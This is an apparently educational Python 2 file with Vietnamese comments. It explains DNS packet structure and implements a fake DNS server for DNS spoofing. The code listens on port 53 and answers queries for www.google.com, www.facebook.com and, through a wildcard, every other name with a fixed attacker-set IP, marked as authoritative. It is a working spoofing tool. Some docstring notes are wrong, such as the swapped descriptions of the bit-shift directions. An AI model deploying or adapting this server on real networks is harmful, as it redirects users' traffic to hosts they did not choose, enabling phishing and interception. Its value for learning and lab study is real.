# -*- coding: utf-8 -*-
"""
Trong phần này mình sẽ build dns server và dns recursive để làm dns spoofing



    +---------+               +------------+            +--------+
    |         | user queries  |            |            |        |
    |  User   |-------------->|            |----------->|Foreign |
    | Program |               | dns server |            |  Name  |
    |         |<--------------| recursive  |<-----------| Server |
    |         | user responses|            |responses   |        |
    +---------+               +------------+            +--------+


 ===================DNS header có độ dài tổng cộng 12 byte======================
     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |           transaction ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

TRANSACTION ID: 16 bit => Đinh danh query để cầu trả lời phải khớp ID

QR            : 1 bit  => định nghĩa là câu hỏi hay câu trả lời 
    0    query
    1    respone

OPCODE        : 4 bit  => định nghĩa kiểu  query trong message
    0    query chuẩn
    1    query ngược
    2    status server 
    3-15  sau này dùng
AA            : 1 bit Authoritative Answer, đại diện cho server Authoritative trả lời
TC            : 1 bit TrunCation xác đinh rặng thông điệp này có được cắt nghắn hay không
RD            : 1 bit  Recursion Desired thêm  data request vào trong gói respone
RA            : 1 bit Recursion available
Z             : 3 bit để dùng  cho mai sau, nên là 0 ở gói request và gói respone
RCODE         : 4 bit
    0     no error
    1     format error
    2     server error
    3     name error
    4     not implement
    5     refused
    6-15   bla bla
QRRCOUNT          : 16 bit Question Resource Record count   số entries trong câu hỏi
ARRCOUNT          : 16 bit Answer Resource Record count số entries trong câu trả lời
AuthorityRRCOUNT  : 16 bit  số bản ghì của authority
AdditionalRRCOUNT  : 16 bit số bản ghi tài nguyên bổ sung

==============================DNS QUERY PAKCET==============================
                 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |           transaction ID                       |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                    QDCOUNT                    |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                    ANCOUNT                    |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                    NSCOUNT                    |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                    ARCOUNT                    |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                                               |
                |                     QNAME                     |
                |                                               |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                     QTYPE                     |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                |                     QCLASS                    |
                +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

QNAME    :   Question Name  ví dụ www.24h.com.vn[]

QTYPE    : 16 bit  kiểu query
          0x01     A record
          0x02     NS record
          0x05     CNAME
          0x0C     PTR record
          0x0F     MX record
          0x21     SRV ,
          ..
QCLASS   : 16 bit đại diện cho lớp câu hỏi  0x0001 là IN (internet)


================================= Respone DNS resource records =============================

     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |           transaction ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    ======================query======================
    |                                               |
    |                     QNAME                     |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QTYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QCLASS                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    ======================respone====================
    |                                               |
    |                                               |
    |                      NAME                     |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    |                     RDATA                     |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+


 nếu gói request có Recursion được bật thì trong gói respone sẽ có gói request thông tin gói respone

 NAME: tên miền
 TYPE:  16 bit  kiểu type của resource ví dụ A, CNAME...
 CLASS: 16 bit   0x0001 là IN
 TTL  : 32 bit  định nghĩa thời gian hết hạn trong cách, phải request lại tính bằng giây
 RDLENGTH:  16 bit chỉ ra độ dài của data respone tính bằng byte ví dụ là 4 byte hihi
 RDATA: Resource Data , độ dài thay đổi chỉ ra data tả về , có thể là ip, domain tùy theo TYPE


 NOTE: data truyền truyên socket là dạng bit nhưng khi ta nhận được compiler sẽ conver cho chũng ta dạng hex, 1 hex = 4 bit , nhưng nó sẽ gom
 thành cặp 2hex = 1 byte = 8 bit

 ôn lại thao tác với bit

 a = 11
 b = 01

 a&b = a and b (axb) = 1
 a|b = a or b (a + b) = 3
 a^b = a xor b = 2 (2 cái giống nhau = 0)
 ~a = đảo ngược bit
 a>>1 dích trái 1 bit
 a<<1 dịch phải 1 bit

 1 ascii --> 6 bit
"""

import socket
import threading
import datetime
import struct


class DefaultConfig():
    TTL = 300  # respone ttl 300s
    IP = "192.168.1.1"
    DNS_FORWARD = "8.8.8.8"
    FAKE_DNS = {
        "www.google.com": "192.168.6.192",
        "www.facebook.com": "192.168.6.192",
        "*": "192.168.6.192"
    }


def int_to_hex(value, zfill=None):
    h = hex(value)  # 300 -> '0x12c'
    h = h[2:].zfill((zfill or 0) * 2)  # '0x12c' -> '00012c' if zfill=3
    return h.decode('hex')


def bin_to_hex(value):
    # '0000 0100 1000 1101' -> '\x04\x8d'
    value = value.replace(' ', '')
    h = '%0*X' % ((len(value) + 3) // 4, int(value, 2))
    return h.decode('hex')


class DnsRequest(object):
    def __init__(self, data):
        self.data = data
        self.lendomain = ""

    def get_tran_id(self):
        """

        :return: return int 
        """
        tran_id = ""
        for id in self.data[:2]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            tran_id = tran_id + hex
        return int(tran_id, base=16)

    def get_qr(self):
        """
        :return: int
         0 = query
         1 = respone
        """
        raw_data = ord(self.data[2]) >> 7
        return raw_data

    def get_opcode(self):
        """

        :return: int
        """
        raw_data = ord(self.data[2]) >> 3 & 15
        return raw_data

    def get_aa(self):
        """

        :return: int
        """
        raw_data = ord(self.data[2]) >> 2 & 1
        return raw_data

    def get_tc(self):
        """

        :return: int 
        """
        raw_data = ord(self.data[2]) >> 1 & 1
        return raw_data

    def get_rd(self):
        raw_data = ord(self.data[2]) & 1
        return raw_data

    def get_ra(self):
        raw_data = ord(self.data[3]) & 128
        return raw_data

    def get_z(self):
        raw_data = ord(self.data[3]) >> 4 & 7
        return raw_data

    def get_rcode(self):
        raw_data = ord(self.data[3]) & 15
        return raw_data

    def get_qrrcount(self):
        qrr = ""
        for id in self.data[4:6]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            qrr = qrr + hex
        return int(qrr, base=16)

    def get_arrcount(self):
        arr = ""
        for id in self.data[6:8]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            arr = arr + hex
        return int(arr, base=16)

    def get_authori_rr(self):
        arr = ""
        for id in self.data[8:10]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            arr = arr + hex
        return int(arr, base=16)

    def get_add_rr(self):
        arr = ""
        for id in self.data[10:12]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            arr = arr + hex
        return int(arr, base=16)

    def get_qname(self):
        domain = ''
        tipo = (ord(self.data[2]) >> 3) & 15  # Opcode bits
        if tipo == 0:  # nếu là gói query
            ini = 12
            len_name_quey = ord(self.data[12])
            while len_name_quey != 0:
                domain += self.data[ini + 1:ini + len_name_quey + 1] + '.'
                ini += len_name_quey + 1
                len_name_quey = ord(self.data[ini])

        self.lendomain = len(domain)
        return domain

    def get_qtype(self):
        arr = ""
        h = ""
        for id in self.data[12 + int(self.lendomain) + 1:12 + int(self.lendomain) + 3]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            arr = arr + hex
            h = h + hex + " "
        return int(arr, base=16)

    def get_qclass(self):
        arr = ""
        h = ""
        for id in self.data[12 + int(self.lendomain) + 3:12 + int(self.lendomain) + 5]:
            hex = "{0:x}".format(ord(id))  # chuyển từ byte sang hex string  \x04 ==> 04
            arr = arr + hex
            h = h + hex + " "
        return int(arr, base=16)


class DnsResponse(object):
    def __init__(self, request, ip, ttl):
        self.request = request
        self.ip = ip
        self.ttl = ttl

    def __str__(self):
        return self.render_packet()

    def get_domain(self):
        domain = ''
        tipo = (ord(self.request[2]) >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = ord(self.request[ini])
            while lon != 0:
                domain += self.request[ini + 1:ini + lon + 1] + '.'
                ini += lon + 1
                lon = ord(self.request[ini])
        return domain

    def _get_ip_bytes(self):
        return str.join('', map(lambda x: chr(int(x)), self.ip.split('.')))

    def _get_ttl_bytes(self):
        return int_to_hex(self.ttl, zfill=4)

    def render_packet(self):
        packet = ''
        if self.get_domain():
            d = self.request
            packet += d[:2]  # Transaction ID
            flags = ''
            flags += '1'  # 1=response, 0=query
            flags += '0000'  # opcode, 0=standard query, 1=inverse query, 2=server status request
            flags += '1'  # Authoritative Answer
            flags += '0'  # Trancated response
            flags += '0'  # Recursion Desired
            flags += '0'  # Recursion Available
            flags += '000'  # reserved, have to be 0
            flags += '0000'  # RCode, 0=no error
            packet += bin_to_hex(flags)
            packet += d[4:6]  # Number of Questions
            packet += d[4:6]  # Number of Answer RRs
            packet += '\x00\x00'  # Number of Authority RRs
            packet += '\x00\x00'  # Number of Additional RRs
            packet += d[12:]  # Original Domain Name Question
            packet += '\xc0\x0c'  # NAME (domain)
            packet += self.request[-4:-2]  # TYPE
            packet += '\x00\x01'  # CLASS (Internet)
            packet += self._get_ttl_bytes()  # TTL time to live
            packet += int_to_hex(4, zfill=2)  # RDLENGTH
            packet += self._get_ip_bytes()  # RDATA
        return packet



def woker_dns(sock, super_addr, data):
    p = DnsRequest(data)

    print "%s: %s  QUERY  ==>  %s" % (datetime.datetime.now(), super_addr[0], p.get_qname())

    # tim trong database xem co record nao khong
    for key in DefaultConfig.FAKE_DNS.keys():
        if p.get_qname().strip(".") == key:
            respone = DnsResponse(data, ttl=DefaultConfig.TTL, ip=DefaultConfig.FAKE_DNS[key])
            sock.sendto(respone.render_packet(), super_addr)
            print "     %s  ==  %s" % (DefaultConfig.FAKE_DNS[key], p.get_qname())
            return

    # neu khong match case nào thi check *
    if "*" in DefaultConfig.FAKE_DNS.keys():
        respone = DnsResponse(data, ttl=DefaultConfig.TTL, ip=DefaultConfig.FAKE_DNS["*"])
        sock.sendto(respone.render_packet(), super_addr)
        print "           %s  ==  %s" % (DefaultConfig.FAKE_DNS["*"], p.get_qname())
        return

    # neu khong thi forward dns google
    try:
        fw_query_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fw_query_udp.sendto(data, (DefaultConfig.DNS_FORWARD, 53))
        rp, addr = fw_query_udp.recvfrom(1024)
        fw_query_udp.close()
        print "           FORWARD DNS  %s" % (DefaultConfig.DNS_FORWARD)
        sock.sendto(str(rp), super_addr)
    except socket.error, msg:
        print 'Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        return


if __name__ == '__main__':
    print 'fake DNS SERVER:: dongvt. 60 IN A %s' % DefaultConfig.IP

    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    try:
        while 1:
            data, addr = udps.recvfrom(1024)
            t = threading.Thread(target=woker_dns, args=(udps, addr, data))
            t.start()



    except KeyboardInterrupt:
        print 'final'
        udps.close()